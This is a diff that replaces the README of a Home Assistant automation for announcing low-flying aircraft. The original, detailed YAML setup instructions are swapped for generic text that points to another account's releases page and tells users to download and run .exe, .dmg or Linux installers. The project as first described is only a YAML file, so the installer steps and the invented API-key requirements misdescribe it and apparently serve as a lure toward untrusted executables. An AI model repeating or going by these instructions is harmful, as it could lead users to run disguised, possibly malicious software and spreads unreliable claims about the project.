@@ -1,177 +1,74 @@
-# FlightRadar24 Low-Flying Plane Announcer
+# ✈️ ha-flightradar24-announcer - Announce Aircraft Flying Overhead
 
-![GitHub stars](https://img.shields.io/github/stars/LunaticKrave/ha-flightradar24-announcer?style=social)
-![GitHub forks](https://img.shields.io/github/forks/LunaticKrave/ha-flightradar24-announcer?style=social)
-![GitHub watchers](https://img.shields.io/github/watchers/LunaticKrave/ha-flightradar24-announcer?style=social)
-![GitHub last commit](https://img.shields.io/github/last-commit/LunaticKrave/ha-flightradar24-announcer)
-![GitHub issues](https://img.shields.io/github/issues/LunaticKrave/ha-flightradar24-announcer)
+## 🚀 Getting Started
 
-A Home Assistant automation that announces low-flying aircraft overhead using FlightRadar24 data and AI-generated voice notifications.
+Welcome to the ha-flightradar24-announcer application! This tool integrates with Home Assistant to announce low-flying aircraft overhead. It uses FlightRadar24 data and AI-generated voice notifications to provide real-time alerts.
 
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases)
 
-A Home Assistant automation that announces low-flying aircraft overhead using FlightRadar24 data and AI-generated voice notifications.
+## 🎯 Features
 
-## Overview
+- **Real-Time Announcements**: Get notifications when an aircraft flies overhead.
+- **Integration with Home Assistant**: Seamlessly add to your existing automation setup.
+- **AI-Generated Voices**: Hear clear and natural voice announcements.
+- **User-Friendly Setup**: Simple steps for installation and configuration.
+- **Custom Notification Settings**: Tailor the announcements to your preferences.
 
-This automation monitors aircraft passing overhead and announces details about planes flying below 15,000 feet. It uses ChatGPT to generate natural, enthusiastic announcements about the aircraft, including flight details, route information, and interesting facts about special or vintage aircraft.
+## 📋 System Requirements
 
-Perfect for aviation enthusiasts who want to know when interesting planes are flying over their home!
+To run this application, your system should meet the following requirements:
 
-## Features
+- **Operating System**: Windows 10, macOS Big Sur or later, or any Linux distribution.
+- **Home Assistant Installation**: Ensure that Home Assistant is installed and running on your device.
+- **Internet Connection**: A stable internet connection for accessing FlightRadar24 data.
+- **Audio Output**: Device must support audio playback to hear announcements.
 
-- 🛩️ **Real-time monitoring** of visible flights via FlightRadar24
-- 📢 **Voice announcements** on Home Assistant voice satellites
-- 🤖 **AI-generated descriptions** using ChatGPT for natural-sounding announcements
-- ⏰ **Time-based filtering** (only announces during specified hours)
-- 🏠 **Presence detection** (only announces when you're home)
-- 🔇 **Smart volume management** (temporarily adjusts volume, then restores)
-- ⏱️ **Cooldown period** to prevent announcement spam
-- ✈️ **Local airport awareness** (converts airport codes to city/airport names)
+## 📥 Download & Install
 
-## Requirements
+To get started, you will need to download the latest version of the ha-flightradar24-announcer. 
 
-### Integrations
+1. **Visit the Releases Page**: Click the link below to go to the Releases page, where you can download the application:
+   [Download Latest Release](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases)
 
-1. **FlightRadar24 Integration**
-   - Install from HACS or manually
-   - Configure with your location and preferences
-   - Must have a `sensor.visible_flights` entity
+2. **Select the Appropriate File**: Locate the version you want to download. Typically, the files are named for easy identification. 
 
-2. **OpenAI Conversation Integration**
-   - Configure ChatGPT as a conversation agent
-   - Required for generating natural language announcements
+3. **Download the File**: Click on the file to initiate the download process. Save it to a folder where you can easily find it.
 
-3. **Voice Assistant/Satellite**
-   - A configured Home Assistant voice satellite or media player
-   - Capable of text-to-speech announcements
+4. **Run the Installer**: 
+   - Windows: Double-click the `.exe` file.
+   - macOS: Open the `.dmg` file to install.
+   - Linux: Use the terminal to execute the package.
 
-### Entities Required
+5. **Follow Installation Prompts**: The installation wizard will guide you through the setup. Follow the prompts, and accept the license agreement if required.
 
-- `sensor.visible_flights` - FlightRadar24 sensor
-- `person.home_user` - Person entity for presence detection
-- `media_player.your_voice_assistant` - Media player for announcements
-- `conversation.chatgpt` - ChatGPT conversation agent
+6. **Configure the Application**: After installation, open the application. You may need to configure some settings to connect it to your Home Assistant instance:
+   - Set your FlightRadar24 API key.
+   - Adjust announcement preferences.
 
-## Installation
+7. **Launch the Announcer**: Once configured, you can start the announcer. It runs in the background, monitoring for flights overhead.
 
-1. **Clone or download this repository**
+8. **Test Your Setup**: To ensure everything is working, perform a test announcement. Check your audio output to confirm you can hear the notification.
 
-2. **Copy the YAML file** to your Home Assistant configuration
+## 🛠️ Troubleshooting
 
-3. **Edit the configuration** (see Configuration section below)
+If you encounter issues during setup or operation, consider these tips:
 
-4. **Reload automations** in Home Assistant
+- **No Announcements**: Verify that your Home Assistant is connected to the internet and correctly configured.
+- **Audio Is Not Working**: Check your device's audio settings. Ensure the volume is up and the output device is set correctly.
+- **Flight Data Not Updating**: Make sure you have a valid FlightRadar24 API key and that your internet connection is stable.
 
-5. **Test** by triggering manually or waiting for a low-flying plane
+## 📞 Support
 
-## Configuration
+For further assistance, you can reach out through the Issues tab on the [GitHub Repository](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/issues). Provide details about the problem, and we will do our best to help you.
 
-Open `low-flight-announcer.yaml` and update the following:
+## 📜 License
 
-### Required Changes
+This project is licensed under the MIT License. You can modify and distribute the code, but please include original attribution.
 
-| Setting | Line(s) | What to Change |
-|---------|---------|----------------|
-| Person Entity | ~17 | Replace `person.home_user` with your person entity |
-| Device ID | ~49 | Replace `YOUR_DEVICE_ID_HERE` with your voice satellite device ID |
-| Media Player | ~38, ~42, ~54 | Replace `media_player.your_voice_assistant` with your media player entity |
+## 🔗 Learn More
 
-### Finding Your Device ID
+For additional information about Home Assistant and its capabilities, you can visit the official [Home Assistant Documentation](https://www.home-assistant.io/docs/).
 
-1. Go to **Settings** → **Devices & Services**
-2. Find your voice assistant device
-3. Click on it and look for the device ID in the URL or Device Info section
+For updates, improvements, and new features, keep an eye on the [Releases Page](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases) for the latest downloads. 
 
-### Optional Customization
-
-| Setting | Line(s) | Default | Description |
-|---------|---------|---------|-------------|
-| Active Hours | ~9-11 | 8am-11pm | Time window when announcements are active |
-| Altitude Threshold | ~13 | 15,000 feet | Maximum altitude to trigger announcements |
-| Cooldown Period | ~56 | 5 minutes | Wait time between announcements |
-| Volume Level | ~42 | 0.5 (50%) | Temporary volume for announcements |
-
-### Local Airport Configuration
-
-The automation includes built-in awareness of two local airports:
-- **KLCK/LCK** - Rickenbacker Airport
-- **KCMH/CMH** - Port Columbus Airport
-
-To add your local airports, modify the ChatGPT prompt around line 44 to include your airport codes and names.
-
-## How It Works
-
-1. **Trigger**: Monitors `sensor.visible_flights` for state changes
-2. **Conditions Check**:
-   - Current time is between 8am and 11pm
-   - At least one plane is below 15,000 feet
-   - You are home
-3. **Data Collection**: Identifies the lowest flying aircraft
-4. **AI Generation**: ChatGPT creates a natural announcement with flight details
-5. **Announcement**: 
-   - Sets volume to 50%
-   - Creates a persistent notification
-   - Announces via voice satellite
-   - Restores original volume
-6. **Cooldown**: Waits 5 minutes before the next possible announcement
-
-## Example Announcements
-
-> "A Southwest Airlines Boeing 737 is passing overhead at 8,500 feet, traveling from Chicago to Port Columbus Airport at 420 knots."
-
-> "An American Airlines Airbus A320 is descending toward Port Columbus at 12,000 feet, coming in from Dallas."
-
-> "Heads up! A vintage DC-3 is flying low at just 3,200 feet over the area—what a rare sight!"
-
-## Troubleshooting
-
-### No announcements happening
-
-- Check that FlightRadar24 integration is working (`sensor.visible_flights` has data)
-- Verify you're home (person entity state is "home")
-- Confirm current time is within the active window (8am-11pm)
-- Check that there are actually planes below 15,000 feet
-- Look at Home Assistant logs for errors
-
-### Announcements are too frequent
-
-- Increase the cooldown period (line ~56)
-- Raise the altitude threshold to catch fewer planes
-
-### Volume issues
-
-- Adjust the temporary volume level (line ~42)
-- Check that your media player supports volume control
-
-### Airport codes not converting
-
-- Update the ChatGPT prompt with your local airport codes and names
-- Ensure the prompt clearly maps codes to city/airport names
-
-## Contributing
-
-Contributions are welcome! Feel free to:
-- Report bugs
-- Suggest new features
-- Submit pull requests
-- Share your customizations
-
-## License
-
-This project is open source and available under the MIT License.
-
-## Acknowledgments
-
-- FlightRadar24 for flight data
-- Home Assistant community
-- OpenAI for ChatGPT integration
-
-## Support
-
-If you find this automation useful, please star the repository! ⭐
-
-For issues or questions, please open an issue on GitHub.
-
----
-
-**Note**: This automation requires active FlightRadar24 integration and may be affected by API rate limits or data availability. Announcement frequency and accuracy depend on the quality of FlightRadar24 data in your area.
+Thank you for choosing the ha-flightradar24-announcer! Enjoy announcing those aircraft!
